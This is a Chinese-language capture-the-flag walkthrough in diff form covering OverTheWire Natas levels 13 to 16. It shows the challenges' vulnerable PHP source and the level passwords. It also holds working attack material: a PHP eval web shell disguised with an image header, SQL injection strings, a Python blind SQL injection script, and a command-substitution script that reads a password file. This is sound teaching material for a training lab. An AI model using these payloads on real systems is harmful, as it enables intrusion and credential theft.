@@ -765,3 +765,393 @@ title: OverTheWire：Natas
 ![添加SHELL](img/natas27.jpg)
 - 进入文件系统后，找到`/etc/natas_webpass/natas13`即可<br>
 ![jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY](img/natas28.jpg)
+
+## Level 13
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas13</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas13.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 页面提示只接收图片文件<br>
+![For security reasons, we now only accept image files!](img/natas29.jpg)
+- 源码中使用`exif_imagetype`函数判断上传的文件是否为图片（返回 FALSE 或图片类型），`exif_imagetype`通过读取文件的第一个字节进行判断
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas13</h1>
+  <div id="content">
+  For security reasons, we now only accept image files!<br/><br/>
+
+  <?
+
+  function genRandomString() {
+      $length = 10;
+      $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+      $string = "";
+
+      for ($p = 0; $p < $length; $p++) {
+          $string .= $characters[mt_rand(0, strlen($characters)-1)];
+      }
+
+      return $string;
+  }
+
+  function makeRandomPath($dir, $ext) {
+      do {
+      $path = $dir."/".genRandomString().".".$ext;
+      } while(file_exists($path));
+      return $path;
+  }
+
+  function makeRandomPathFromFilename($dir, $fn) {
+      $ext = pathinfo($fn, PATHINFO_EXTENSION);
+      return makeRandomPath($dir, $ext);
+  }
+
+  if(array_key_exists("filename", $_POST)) {
+      $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+      $err=$_FILES['uploadedfile']['error'];
+      if($err){
+          if($err === 2){
+              echo "The uploaded file exceeds MAX_FILE_SIZE";
+          } else{
+              echo "Something went wrong :/";
+          }
+      } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+          echo "File is too big";
+      } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+          echo "File is not an image";
+      } else {
+          if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+              echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+          } else{
+              echo "There was an error uploading the file, please try again!";
+          }
+      }
+  } else {
+  ?>
+
+  <form enctype="multipart/form-data" action="index.php" method="POST">
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+  Choose a JPEG to upload (max 1KB):<br/>
+  <input name="uploadedfile" type="file" /><br />
+  <input type="submit" value="Upload File" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 在`hack.php`中添加任意图片文件文件头即可绕过`exif_imagetype`检查
+  ```php
+  BM
+  <?php @eval($_POST['pass']);?>
+  ```
+- 接下来，修改前端文件后缀名、上传文件、使用菜刀的步骤、方法与 [Level 12](#level-12) 一致<br>
+![Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1](img/natas30.jpg)
+
+### 参考资料
+
+[PHP: exif_imagetype - Manual](https://www.php.net/manual/en/function.exif-imagetype.php)
+
+## Level 14
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas14</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas14.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 一个用户登录的表单<br>
+![Username / Password](img/natas31.jpg)
+- 从源代码可以看到，提交的表单字符串未经过任何过滤，直接被拼接到了 SQL 语句中
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas14</h1>
+  <div id="content">
+  <?
+  if(array_key_exists("username", $_REQUEST)) {
+      $link = mysql_connect('localhost', 'natas14', '<censored>');
+      mysql_select_db('natas14', $link);
+
+      # 注意是双引号
+      $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+      if(array_key_exists("debug", $_GET)) {
+          echo "Executing query: $query<br>";
+      }
+
+      if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+              echo "Successful login! The password for natas15 is <censored><br>";
+      } else {
+              echo "Access denied!<br>";
+      }
+      mysql_close($link);
+  } else {
+  ?>
+
+  <form action="index.php" method="POST">
+  Username: <input name="username"><br>
+  Password: <input name="password"><br>
+  <input type="submit" value="Login" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 使用最简单的 SQL 注入方式即可<br>
+![" or "1"="1 或 " or 1=1#](img/natas32.jpg)
+- 下一关口令 GET✔<br>
+![AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J](img/natas33.jpg)
+
+## Level 15
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas15</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas15.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 输入用户名，检查该用户是否存在<br>
+![Check existence](img/natas34.jpg)
+- 查看源码，其中提供了 users 数据库表结构，各字段的类型及长度限制
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas15</h1>
+  <div id="content">
+  <?
+
+  # 提供了 users 数据库表结构
+  /*
+  CREATE TABLE `users` (
+    `username` varchar(64) DEFAULT NULL,
+    `password` varchar(64) DEFAULT NULL
+  );
+  */
+
+  if(array_key_exists("username", $_REQUEST)) {
+      $link = mysql_connect('localhost', 'natas15', '<censored>');
+      mysql_select_db('natas15', $link);
+
+      $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+      if(array_key_exists("debug", $_GET)) {
+          echo "Executing query: $query<br>";
+      }
+      $res = mysql_query($query, $link);
+      if($res) {
+      # 查询结果不直接回显
+      if(mysql_num_rows($res) > 0) {
+          echo "This user exists.<br>";
+      } else {
+          echo "This user doesn't exist.<br>";
+      }
+      } else {
+          echo "Error in query.<br>";
+      }
+
+      mysql_close($link);
+  } else {
+  ?>
+
+  <form action="index.php" method="POST">
+  Username: <input name="username"><br>
+  <input type="submit" value="Check existence" />
+  </form>
+  <? } ?>
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 由于查询结果不能回显到前端，需要进行 SQL 盲注（*blind-based SQL injection*）
+- 需要获取的是用户 **natas16** 的口令，查询、确认该用户存在<br>
+![用户 natas16 存在](img/natas35.jpg)
+- 通过布尔型 SQL 盲注获取 32 位的口令
+  ```py
+  #!/usr/bin/python
+  # -*- coding: UTF-8 -*-
+
+  import requests
+  from lxml import etree
+
+  auth_username = 'natas15'
+  auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+  url = 'http://natas15.natas.labs.overthewire.org'
+
+  table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+
+  key = ''
+  for i in range(1, 33):
+      l, r = 0, 61
+      while l <= r:
+          mid = (l + r) >> 1
+          ch = table[mid]
+          res = requests.post(url + '/index.php', {'username' : '" UNION SELECT * FROM users WHERE username = "natas16" and ascii(SUBSTRING(password, %d, 1)) >= ascii("%s")#' % (i, ch)}, auth = (auth_username, auth_password), headers={'Connection':'close'})
+          sqlres = etree.HTML(res.content).xpath('/html/body/div/text()')[0]
+          if "This user exists" in sqlres:
+              l = mid + 1
+              ans = mid
+          else:
+              r = mid - 1
+      key += table[ans]
+  print(key)
+  ```
+
+### 参考资料
+
+- [What is Blind SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind)
+- [How can I make SQL case sensitive string comparison on MySQL? - Stack Overflow](https://stackoverflow.com/a/5629121/13542937)
+
+## Level 16
+
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas16</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas16.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+- 是 [Level 10](#level-10) 的加强版(—ˋωˊ—)<br>
+![For security reasons, we now filter even more on certain characters](img/natas36.jpg)
+- 与 [Level 10](#level-10) 的主要区别为多过滤了反引号、单双引号，并且在执行`grep`命令的语句中，使用双引号包裹了`$key`变量
+  ```html
+  <html>
+  <head>
+  <!-- This stuff in the header has nothing to do with the level -->
+  </head>
+  <body>
+  <h1>natas16</h1>
+  <div id="content">
+
+  For security reasons, we now filter even more on certain characters<br/><br/>
+  <form>
+  Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+  </form>
+
+
+  Output:
+  <pre>
+  <?
+  $key = "";
+
+  if(array_key_exists("needle", $_REQUEST)) {
+      $key = $_REQUEST["needle"];
+  }
+
+  if($key != "") {
+      if(preg_match('/[;|&`\'"]/',$key)) {
+          print "Input contains an illegal character!";
+      } else {
+          # 无论什么输入都只能作为模式字符串
+          passthru("grep -i \"$key\" dictionary.txt");
+      }
+  }
+  ?>
+  </pre>
+
+  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+  </div>
+  </body>
+  </html>
+  ```
+- 还剩下命令替换`$(cmd)`没有被过滤，可使用类似 [Level 15](#level-15) 的方法依次获取下一关口令字符
+- 提交`?needle=$(grep -E ^.{n-1}X /etc/natas_webpass/natas17)Allah`，即查看`/etc/natas_webpass/natas17`内字符串的第 *n* 位是否为 *X*，若是，返回值不为空，与其后紧随的单词组合导致无法在`dictionary.txt`查找到该词，返回为空，否则将在 *Output* 处有输出
+  ```py
+  #!/usr/bin/python
+  # -*- coding: UTF-8 -*-
+
+  import requests
+  from lxml import etree
+
+  auth_username = 'natas16'
+  auth_password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+  url = 'http://natas16.natas.labs.overthewire.org/'
+
+  table = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+
+  key = ''
+  for i in range(1, 33):
+      for ch in table:
+          res = requests.post(url + '?needle=$(grep -E ^.{%d}%c /etc/natas_webpass/natas17)Allah'%(i - 1, ch), auth = (auth_username, auth_password), headers={'Connection':'close'})
+          sqlres = etree.HTML(res.content).xpath('/html/body/div[1]/pre/text()')[0].strip()
+          if len(sqlres) == 0:
+              key += ch
+              break
+  print(key)
+  ```
